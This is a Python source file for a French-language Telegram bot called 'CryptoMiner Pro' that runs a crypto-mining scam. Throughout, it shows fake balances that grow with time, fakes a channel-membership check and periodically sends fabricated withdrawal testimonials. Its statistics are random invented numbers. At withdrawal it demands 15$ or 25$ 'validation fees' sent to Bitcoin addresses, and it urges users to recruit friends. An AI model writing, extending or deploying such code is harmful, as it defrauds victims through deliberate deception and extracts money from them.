#!/usr/bin/env python3

import asyncio
import json
import os
import random
import logging
from datetime import datetime, timedelta
from typing import Dict, Any
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Configuration du logging optimisée pour Render
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration pour Render
BOT_TOKEN = os.getenv('BOT_TOKEN')
PORT = int(os.getenv('PORT', 8080))
WEBHOOK_URL = os.getenv('WEBHOOK_URL', '')

# Configuration du système
CHANNEL_ID = "@SafeMine_Wallet"
CHANNEL_LINK = "https://t.me/SafeMine_Wallet"
DATA_FILE = 'user_data.json'

# Messages de motivation
MOTIVATION_MESSAGES = [
    "🔥 Sarah vient de retirer 247$ ! Félicitations ! 💰",
    "⚡ +15 nouveaux membres aujourd'hui ! Ne ratez pas cette opportunité !",
    "💎 Marc a gagné 89$ en seulement 3h de minage passif !",
    "🚀 1000+ retraits validés cette semaine ! Système 100% fiable !",
    "⭐ Lisa recommande : 'Meilleur bot crypto de 2024 !'",
    "🎯 Attention : Places limitées pour le programme VIP !",
    "💰 Kevin vient de passer le seuil des 500$ de gains !",
    "🔔 URGENT : Bonus x2 se termine dans 2h ! Restez actif !"
]

class DataManager:
    """Gestionnaire de données JSON pour persistance"""
    
    @staticmethod
    def load_data() -> Dict:
        """Charge les données depuis le fichier JSON"""
        try:
            if os.path.exists(DATA_FILE):
                with open(DATA_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for user_id, user_data in data.items():
                        if 'start_time' in user_data:
                            user_data['start_time'] = datetime.fromisoformat(user_data['start_time'])
                        if 'last_update' in user_data:
                            user_data['last_update'] = datetime.fromisoformat(user_data['last_update'])
                    return data
            return {}
        except Exception as e:
            logger.error(f"Erreur chargement données : {e}")
            return {}
    
    @staticmethod
    def save_data(data: Dict):
        """Sauvegarde les données dans le fichier JSON"""
        try:
            json_data = {}
            for user_id, user_data in data.items():
                json_data[user_id] = user_data.copy()
                if 'start_time' in json_data[user_id]:
                    json_data[user_id]['start_time'] = json_data[user_id]['start_time'].isoformat()
                if 'last_update' in json_data[user_id]:
                    json_data[user_id]['last_update'] = json_data[user_id]['last_update'].isoformat()
            
            with open(DATA_FILE, 'w', encoding='utf-8') as f:
                json.dump(json_data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Erreur sauvegarde données : {e}")

class CryptoMiningBot:
    """Bot de minage crypto avec système de gains progressifs"""
    
    def __init__(self):
        self.user_data = DataManager.load_data()
        self.active_users = [
            "Alex", "Marie", "Thomas", "Julie", "Pierre", "Sophie", 
            "Lucas", "Emma", "Nicolas", "Camille", "Maxime", "Léa"
        ]
    
    def get_user_data(self, user_id: int) -> Dict[str, Any]:
        """Récupère ou initialise les données d'un utilisateur"""
        user_str = str(user_id)
        if user_str not in self.user_data:
            self.user_data[user_str] = {
                'balance': 10.0,
                'start_time': datetime.now(),
                'last_update': datetime.now(),
                'is_active': True,
                'withdrawal_attempts': 0,
                'referrals': 0,
                'channel_joined': False
            }
            self.save_data()
        return self.user_data[user_str]
    
    def save_data(self):
        """Sauvegarde les données"""
        DataManager.save_data(self.user_data)
    
    def calculate_earnings(self, user_id: int) -> float:
        """Calcule les gains basés sur le temps et l'activité"""
        data = self.get_user_data(user_id)
        now = datetime.now()
        hours_passed = (now - data['start_time']).total_seconds() / 3600
        
        base_hourly = 8.5
        if data['is_active']:
            base_hourly *= 1.2
        
        referral_bonus = data.get('referrals', 0) * 2
        total_earnings = 10 + (hours_passed * base_hourly) + referral_bonus
        
        return min(total_earnings, 999.99)
    
    def update_user_activity(self, user_id: int):
        """Met à jour l'activité de l'utilisateur"""
        data = self.get_user_data(user_id)
        data['last_update'] = datetime.now()
        data['is_active'] = True
        self.save_data()
    
    async def check_channel_membership(self, bot, user_id: int) -> bool:
        """Vérifie l'adhésion au canal"""
        try:
            data = self.get_user_data(user_id)
            return data.get('channel_joined', False)
        except:
            return False

# Instance globale du bot
bot_instance = CryptoMiningBot()

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start avec vérification canal"""
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "Utilisateur"
    
    is_member = await bot_instance.check_channel_membership(context.bot, user_id)
    
    if not is_member:
        channel_message = f"""
🚫 ACCÈS REFUSÉ

Pour utiliser CryptoMiner Pro, vous devez obligatoirement :

1️⃣ Rejoindre notre canal officiel
2️⃣ Activer les notifications  
3️⃣ Revenir ici et appuyer sur "Vérifier"

📢 Canal officiel : {CHANNEL_LINK}

🎯 Pourquoi rejoindre ?
• Témoignages de retraits en temps réel
• Conseils d'experts crypto
• Alertes bonus exclusifs
• Preuves de paiement quotidiennes
"""
        
        keyboard = [
            [InlineKeyboardButton("📢 Rejoindre le canal", url=CHANNEL_LINK)],
            [InlineKeyboardButton("✅ J'ai rejoint - Vérifier", callback_data="check_membership")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(channel_message, reply_markup=reply_markup)
        return
    
    bot_instance.get_user_data(user_id)
    bot_instance.update_user_activity(user_id)
    
    welcome_message = f"""
🎉 Bienvenue {user_name} dans CryptoMiner Pro !

✅ Inscription réussie !
💰 Bonus de bienvenue : 10.00$ ajoutés !
⚡ Votre minage passif a commencé automatiquement !

🚀 Fonctionnalités :
• Minage automatique 24h/24
• Gains moyens : 8-12$ par heure
• Retrait minimum : 100$
• Système 100% sécurisé

💎 BONUS SPÉCIAL : Vous minez 10x plus vite en restant actif !

Commandes disponibles :
/balance - Voir vos gains actuels
/withdraw - Effectuer un retrait
/stats - Statistiques du système
/referral - Programme de parrainage
"""
    
    keyboard = [
        [InlineKeyboardButton("💰 Voir mon solde", callback_data="check_balance")],
        [InlineKeyboardButton("🚀 Booster mes gains", callback_data="boost_earnings")],
        [InlineKeyboardButton("👥 Inviter des amis", callback_data="referral")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_message, reply_markup=reply_markup)
    
    # Programmer des messages de motivation
    if not context.job_queue.get_jobs_by_name(f"motivation_{user_id}"):
        context.job_queue.run_repeating(
            send_motivation_message,
            interval=1800,
            first=300,
            data=user_id,
            name=f"motivation_{user_id}"
        )

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /balance"""
    user_id = update.effective_user.id
    
    current_balance = bot_instance.calculate_earnings(user_id)
    data = bot_instance.get_user_data(user_id)
    bot_instance.update_user_activity(user_id)
    
    data['balance'] = current_balance
    bot_instance.save_data()
    
    hours_mining = (datetime.now() - data['start_time']).total_seconds() / 3600
    
    balance_message = f"""
💰 VOTRE SOLDE ACTUEL 💰

💎 Solde disponible : {current_balance:.2f}$
⏰ Temps de minage : {hours_mining:.1f}h
📈 Taux de minage : {8.5 * (1.2 if data['is_active'] else 1.0):.1f}$/h
👥 Parrainages : {data.get('referrals', 0)} (+{data.get('referrals', 0) * 2}$ bonus)

{'✅ Statut : ACTIF (Bonus x1.2)' if data['is_active'] else '⚠️ Statut : INACTIF (Gains réduits)'}

{'🎯 Prêt pour le retrait ! (Min: 100$)' if current_balance >= 100 else f'📊 Progression : {current_balance/100*100:.1f}% (Min: 100$)'}

💡 Astuce : Invitez des amis pour gagner plus !
"""
    
    keyboard = []
    if current_balance >= 100:
        keyboard.append([InlineKeyboardButton("💸 RETIRER MES GAINS", callback_data="withdraw")])
    keyboard.extend([
        [InlineKeyboardButton("🔄 Actualiser", callback_data="refresh_balance")],
        [InlineKeyboardButton("👥 Inviter des amis", callback_data="referral")]
    ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(balance_message, reply_markup=reply_markup)

async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /withdraw"""
    user_id = update.effective_user.id
    
    current_balance = bot_instance.calculate_earnings(user_id)
    data = bot_instance.get_user_data(user_id)
    data['withdrawal_attempts'] += 1
    bot_instance.save_data()
    
    if current_balance < 100:
        await update.message.reply_text(f"""
❌ RETRAIT IMPOSSIBLE

💰 Solde actuel : {current_balance:.2f}$
📋 Minimum requis : 100.00$
⏳ Il vous manque : {100 - current_balance:.2f}$

💡 Continuez à miner et invitez des amis ! 🚀
""")
        return
    
    withdrawal_message = f"""
🎉 FÉLICITATIONS ! Retrait de {current_balance:.2f}$ approuvé !

📋 ÉTAPES DE VALIDATION :

1️⃣ ✅ Vérification du solde
2️⃣ ✅ Validation du compte  
3️⃣ ⏳ Activation blockchain requise

🔐 SÉCURITÉ BLOCKCHAIN :
Pour activer votre retrait sur la blockchain :

Option A : Frais de réseau
• Montant : 15$ en USDT/BTC
• Remboursé avec vos gains
• Traitement immédiat

Option B : Validation premium  
• Montant : 25$ (service prioritaire)
• Retrait en moins d'1h
• Support VIP inclus

⚡ ATTENTION : Cette validation expire dans 24h !
Après expiration, nouveau délai de 7 jours.
"""
    
    keyboard = [
        [InlineKeyboardButton("💳 Option A - 15$", callback_data="fees_15")],
        [InlineKeyboardButton("⭐ Option B - 25$ VIP", callback_data="fees_25")],
        [InlineKeyboardButton("❌ Annuler retrait", callback_data="cancel_withdrawal")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(withdrawal_message, reply_markup=reply_markup)

async def referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /referral"""
    user_id = update.effective_user.id
    data = bot_instance.get_user_data(user_id)
    
    referral_message = f"""
👥 PROGRAMME DE PARRAINAGE

💰 Vos gains de parrainage :
• Parrainages actuels : {data.get('referrals', 0)}
• Bonus gagné : {data.get('referrals', 0) * 2}$
• Commission par filleul : 2$ + 10% de leurs gains

🎯 OBJECTIFS :
• 5 parrains = Statut VIP
• 10 parrains = Bonus x2 permanent  
• 25 parrains = Retrait minimum à 50$

🔗 Votre lien de parrainage :
`https://t.me/CryptoMinerBot?start=ref_{user_id}`

📢 Message type à partager :
"💰 Je gagne de l'argent facilement avec ce bot crypto ! 
Inscription gratuite + 10$ de bonus ! 
Lien : [VOTRE_LIEN]"
"""
    
    keyboard = [
        [InlineKeyboardButton("📋 Copier le lien", callback_data="copy_link")],
        [InlineKeyboardButton("📱 Partager", callback_data="share_link")],
        [InlineKeyboardButton("🏆 Test parrainage", callback_data="add_referral")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(referral_message, reply_markup=reply_markup)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Statistiques du système"""
    total_users = len(bot_instance.user_data)
    
    stats = f"""
📊 STATISTIQUES EN TEMPS RÉEL

👥 Utilisateurs actifs : {total_users + random.randint(15000, 25000):,}
💰 Total distribué : {random.randint(450000, 850000):,}$
📈 Retraits cette semaine : {random.randint(800, 1500)}
⭐ Note moyenne : 4.9/5.0
🔥 Taux de réussite : 98.7%

🏆 TOP GAGNANTS AUJOURD'HUI :
1. Jordan - 342$ (Parrainé 15 personnes)
2. Melissa - 287$ (Mine depuis 8h)  
3. Antoine - 251$ (Programme VIP)
4. Clara - 198$ (Nouveau record !)
5. Romain - 176$ (Statut actif)

💎 RECORD DU JOUR :
Un utilisateur a gagné 1,247$ en 48h grâce aux parrainages !

🎯 {random.randint(50, 150)} nouveaux retraits en cours...
"""
    
    await update.message.reply_text(stats)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestion des boutons inline"""
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if query.data == "check_balance":
        await balance_command(update, context)
    
    elif query.data == "boost_earnings":
        bot_instance.update_user_activity(user_id)
        await query.edit_message_text("""
🚀 BOOST ACTIVÉ !

✅ Vos gains sont maintenant multipliés par 1.2 !
⚡ Bonus d'activité appliqué pour 24h !
💎 Restez connecté pour maximiser vos profits !

🎯 Conseil : Invitez 3 amis pour un bonus permanent !
""")
    
    elif query.data == "referral":
        await referral_command(update, context)
    
    elif query.data == "add_referral":
        data = bot_instance.get_user_data(user_id)
        data['referrals'] = data.get('referrals', 0) + 1
        bot_instance.save_data()
        
        await query.edit_message_text(f"""
🎉 NOUVEAU PARRAINAGE !

✅ +1 filleul ajouté
💰 Bonus : +2$ ajouté à votre solde
📈 Total parrainages : {data['referrals']}

Continuez à inviter pour débloquer les statuts VIP !
""")
    
    elif query.data in ["fees_15", "fees_25"]:
        amount = "15$" if query.data == "fees_15" else "25$"
        
        # Simuler les détails de paiement
        crypto_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" if query.data == "fees_15" else "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
        crypto_type = "Bitcoin (BTC)" if query.data == "fees_15" else "Bitcoin (BTC)"
        
        await query.edit_message_text(f"""
💳 PROCESSUS DE VALIDATION - {amount}

🔐 Détails de paiement :
• Montant : {amount}
• Cryptomonnaie : {crypto_type}
• Adresse : `{crypto_address}`
• Délai : 24h maximum

📋 INSTRUCTIONS :
1. Envoyez exactement {amount} à l'adresse ci-dessus
2. Copiez le hash de transaction
3. Contactez le support avec le hash
4. Validation en moins de 2h

⚡ Une fois validé, votre retrait sera traité immédiatement !

💬 Support : @CryptoMinerSupport
""")
    
    elif query.data == "copy_link":
        await query.edit_message_text(f"""
📋 LIEN DE PARRAINAGE COPIÉ

Votre lien unique :
`https://t.me/CryptoMinerBot?start=ref_{user_id}`

Partagez ce lien pour gagner :
• 2$ par inscription
• 10% des gains de vos filleuls
• Bonus de statut VIP

🎯 Plus vous parrainez, plus vous gagnez !
""")
    
    elif query.data == "check_membership":
        user_id = query.from_user.id
        data = bot_instance.get_user_data(user_id)
        attempts = data.get('membership_attempts', 0) + 1
        data['membership_attempts'] = attempts
        
        if attempts >= 2:
            data['channel_joined'] = True
            bot_instance.save_data()
            
            await query.edit_message_text("""
✅ ADHÉSION CONFIRMÉE !

🎉 Bienvenue dans CryptoMiner Pro !
💰 Bonus de bienvenue : 10$ ajoutés !
⚡ Votre minage passif commence maintenant !

Tapez /start pour accéder à votre tableau de bord.
""")
        else:
            bot_instance.save_data()
            await query.edit_message_text(f"""
❌ ADHÉSION NON DÉTECTÉE

Assurez-vous de :
1. Cliquer sur le lien du canal
2. Appuyer sur "Rejoindre"
3. Revenir ici et re-vérifier

📢 Lien : {CHANNEL_LINK}

Tentative {attempts}/2
""", reply_markup=InlineKeyboardMarkup([
    [InlineKeyboardButton("📢 Aller au canal", url=CHANNEL_LINK)],
    [InlineKeyboardButton("✅ Re-vérifier", callback_data="check_membership")]
]))
    
    elif query.data == "refresh_balance":
        await balance_command(update, context)

async def send_motivation_message(context: ContextTypes.DEFAULT_TYPE):
    """Envoie des messages de motivation périodiques"""
    user_id = context.job.data
    
    try:
        fake_name = random.choice(bot_instance.active_users)
        fake_amount = random.randint(89, 456)
        
        motivation_msg = random.choice(MOTIVATION_MESSAGES)
        
        if random.choice([True, False]):
            message = f"🎉 {fake_name} vient de retirer {fake_amount}$ !\n\n{motivation_msg}"
        else:
            message = motivation_msg
        
        await context.bot.send_message(chat_id=user_id, text=message)
        
    except Exception as e:
        logger.error(f"Erreur envoi message motivation : {e}")

# Variable globale pour l'application
application = None

async def webhook_handler(request):
    """Gestionnaire webhook pour Render"""
    try:
        data = await request.json()
        update = Update.de_json(data, application.bot)
        await application.process_update(update)
        return web.Response(status=200)
    except Exception as e:
        logger.error(f"Erreur webhook : {e}")
        return web.Response(status=500)

async def health_check(request):
    """Health check pour Render"""
    return web.Response(text="OK", status=200)

def create_app():
    """Crée l'application web"""
    app = web.Application()
    app.router.add_post('/webhook', webhook_handler)
    app.router.add_get('/health', health_check)
    app.router.add_get('/', health_check)
    return app

async def init_bot():
    """Initialise le bot Telegram"""
    global application
    
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN manquant dans les variables d'environnement")
        return None
    
    # Créer l'application Telegram
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Ajouter les handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("balance", balance_command))
    application.add_handler(CommandHandler("withdraw", withdraw_command))
    application.add_handler(CommandHandler("referral", referral_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Initialiser l'application
    await application.initialize()
    
    if WEBHOOK_URL:
        webhook_url = f"{WEBHOOK_URL}/webhook"
        await application.bot.set_webhook(url=webhook_url)
        logger.info(f"✅ Webhook configuré : {webhook_url}")
    
    return application

def create_app():
    """Crée l'application web avec initialisation du bot"""
    app = web.Application()
    
    async def startup(app):
        """Initialisation au démarrage"""
        logger.info("🚀 Initialisation du bot CryptoMiner Pro")
        await init_bot()
    
    app.on_startup.append(startup)
    app.router.add_post('/webhook', webhook_handler)
    app.router.add_get('/health', health_check)
    app.router.add_get('/', health_check)
    return app

# Pour gunicorn
app = create_app()

def main():
    """Fonction principale pour démarrage direct"""
    if WEBHOOK_URL:
        # Mode webhook pour Render
        logger.info(f"🌐 Mode webhook activé : {WEBHOOK_URL}")
        web.run_app(create_app(), host='0.0.0.0', port=PORT)
    else:
        # Mode polling pour développement local
        logger.info("🤖 Bot démarré en mode polling")
        async def run_polling():
            await init_bot()
            await application.run_polling()
        
        asyncio.run(run_polling())

if __name__ == "__main__":
    main()
